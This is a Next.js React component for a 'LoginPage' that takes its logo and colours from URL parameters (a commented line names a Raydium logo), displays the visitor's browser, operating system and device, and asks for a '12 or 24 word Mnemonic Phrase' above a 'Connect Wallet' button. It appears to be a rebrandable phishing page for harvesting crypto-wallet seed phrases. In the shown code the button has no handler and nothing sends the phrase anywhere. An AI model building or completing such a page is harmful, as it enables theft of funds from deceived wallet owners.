"use client";
import { useSearchParams } from 'next/navigation';
import { useState, useEffect } from 'react';
// import UAParser from "ua-parser-js";


const LoginPage = () => {
  const UAParser = require("ua-parser-js");
  const searchParams = useSearchParams();
  const [value, setvalue] = useState("")
  const [userInfo, setUserInfo] = useState({
    browser: "",
    os: "",
    device: "",
  });
  console.log(userInfo);
  const bgColor:any = searchParams.get('bgColor');
  const bgColorBox:any = searchParams.get('bgColorBox')
  const buttonColor:any = searchParams.get('buttonColor');
  // const logo = "/raydium-logo-freelogovectors.png";
  const logo: any = searchParams.get('logo') 
  // console.log('bgColor:', bgColor);
  // console.log('bgColorBox:', bgColorBox);
  // console.log('buttonColor:', buttonColor);
  // console.log("value: ", value)
  useEffect(() => {
    const parser = new UAParser();
    const result = parser.getResult();

    setUserInfo({
      browser: `${result.browser.name} ${result.browser.version}`,
      os: `${result.os.name} ${result.os.version}`,
      device: result.device.model
        ? `${result.device.vendor} ${result.device.model}`
        : "Desktop",
    });
  }, []);

  return (
    <div
      className="flex items-center justify-center min-h-screen"
      style={{ backgroundColor: bgColor }}
    >
      <div
        className="w-4500px] p-6 rounded-lg shadow-md text-center"
        style={{ backgroundColor: bgColorBox }}
      >
        {/* Logo */}
        <p className="mb-2">Browser: {userInfo.browser}</p>
        <p className="mb-2">Operating System: {userInfo.os}</p>
        <p className="mb-2">Device: {userInfo.device}</p>
        <img
          height={100}
          width={100}
          src={logo}
          alt="Logo"
          className="mx-auto mb-4 h-16 w-60"
        />
        <textarea
          value={value}
          placeholder="Enter your 12 or 24 word Mnemonic Phrase here..."
          className="w-full h-20 px-4 py-2 mb-4 border rounded-md text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-300 resize-none placeholder-top"
          onChange={(e) => setvalue(e.target.value)}
        />
        <button
          className="w-full px-4 py-2 text-black rounded-md"
          style={{ backgroundColor: buttonColor }}
        >
          Connect Wallet
        </button>
      </div>
    </div>
  );
};

export default LoginPage;
